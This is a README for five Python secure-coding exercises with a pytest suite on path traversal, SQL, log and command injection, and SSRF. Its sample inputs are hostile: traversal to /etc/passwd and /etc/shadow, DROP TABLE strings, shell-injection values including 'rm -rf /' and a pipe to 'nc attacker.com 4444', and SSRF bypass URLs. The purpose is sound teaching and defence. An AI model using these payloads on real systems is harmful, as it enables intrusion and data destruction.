# Security Coding Exercises

Five Python functions covering common injection and bypass prevention patterns.

| File | Function | Attack class |
|------|----------|-------------|
| `solve_file_path.py` | `resolve_path(base_dir, filename)` | Path traversal |
| `build_sql_query.py` | `build_query(table, filters)` | SQL injection |
| `format_log.py` | `format_log(level, message, context)` | Log injection / data leakage |
| `run_subprocess.py` | `build_ping_args(hostname)` | Command injection |
| `validate_url.py` | `validate_url(url)` | SSRF |

---

## Run the test suite

```bash
# Run all 101 tests
python3 -m pytest -v

# Run tests for a single module
python3 -m pytest test_solve_file_path.py -v
python3 -m pytest test_build_sql_query.py -v
python3 -m pytest test_format_log.py -v
python3 -m pytest test_run_subprocess.py -v
python3 -m pytest test_validate_url.py -v

# Run a specific test class or test
python3 -m pytest test_format_log.py::TestLogInjection -v
python3 -m pytest test_validate_url.py::TestBypassTricks::test_hex_ip -v

# Stop on first failure
python3 -m pytest -x

# Show print output (useful when debugging)
python3 -m pytest -s
```

---

## Try your own inputs

Each file has an `if __name__ == "__main__"` block you can edit and run directly.

### 1. File path resolver

```bash
python3 solve_file_path.py
```

Edit the `tests` list at the bottom of `solve_file_path.py`, or use the Python REPL:

```python
from solve_file_path import resolve_path

# Valid
resolve_path("/var/www/files", "report.pdf")

# Traversal attempts
resolve_path("/var/www/files", "../../etc/passwd")
resolve_path("/var/www/files", "%2e%2e%2f%2e%2e%2fetc%2fpasswd")
resolve_path("/var/www/files", "sub/../../../etc/shadow")
```

### 2. SQL query builder

```bash
python3 build_sql_query.py
```

```python
from build_sql_query import build_query

# Valid parameterized query
build_query("users", {"name": "alice", "active": 1})

# Injection in value — safe because it's bound data, not interpolated SQL
build_query("users", {"name": "' OR '1'='1"})
build_query("orders", {"id": "1; DROP TABLE orders;--"})

# Invalid identifiers
build_query("us;ers", {"id": 1})
build_query("users", {"col name": "x"})
```

### 3. Log formatter

```bash
python3 format_log.py
```

```python
from format_log import format_log

# Normal entry
format_log("INFO", "User login", {"user": "alice", "ip": "1.2.3.4"})

# Log injection attempt
format_log("ERROR", "Failed\n[INFO] Fake log entry forged", {})

# Sensitive field masking
format_log("INFO", "Request", {"Authorization": "Bearer secret-token", "user": "bob"})
format_log("DEBUG", "Config loaded", {"api_key": "sk-abc123", "retries": "3"})

# Invalid level
format_log("FATAL", "crash", {})
```

### 4. Subprocess argument builder

```bash
python3 run_subprocess.py
```

```python
from run_subprocess import build_ping_args

# Valid
build_ping_args("google.com")
build_ping_args("8.8.8.8")

# Injection attempts
build_ping_args("google.com; rm -rf /")
build_ping_args("$(cat /etc/passwd)")
build_ping_args("host`whoami`.evil.com")
build_ping_args("google.com | nc attacker.com 4444")
```

Once you have a safe arg list you can actually run it:

```python
import subprocess
from run_subprocess import build_ping_args

args = build_ping_args("8.8.8.8")
result = subprocess.run(args, shell=False, capture_output=True, text=True)
print(result.stdout)
```

### 5. URL validator

```bash
python3 validate_url.py
```

```python
from validate_url import validate_url

# Valid
validate_url("https://google.com")

# Blocked schemes
validate_url("file:///etc/passwd")
validate_url("gopher://internal:6379/_FLUSHALL")

# Private ranges (SSRF)
validate_url("http://169.254.169.254/latest/meta-data/")   # AWS metadata
validate_url("http://10.0.0.1/internal-api")
validate_url("http://192.168.1.1/router-admin")

# Bypass tricks
validate_url("http://0x7f000001/")        # hex IP for 127.0.0.1
validate_url("http://2130706433/")        # decimal IP for 127.0.0.1
validate_url("http://127.1/")             # short-form loopback
validate_url("http://0/")                 # resolves to 0.0.0.0
```

---

## Adding new tests

Add a test function or class to the relevant `test_*.py` file:

```python
# test_format_log.py
def test_my_custom_case():
    result = format_log("INFO", "my message", {"user": "bob"})
    assert "bob" in result
```

Then run it:

```bash
python3 -m pytest test_format_log.py::test_my_custom_case -v
```

To test that an error is raised:

```python
import pytest
from validate_url import validate_url

def test_my_blocked_url():
    with pytest.raises(ValueError):
        validate_url("http://192.168.99.99/secret")
```
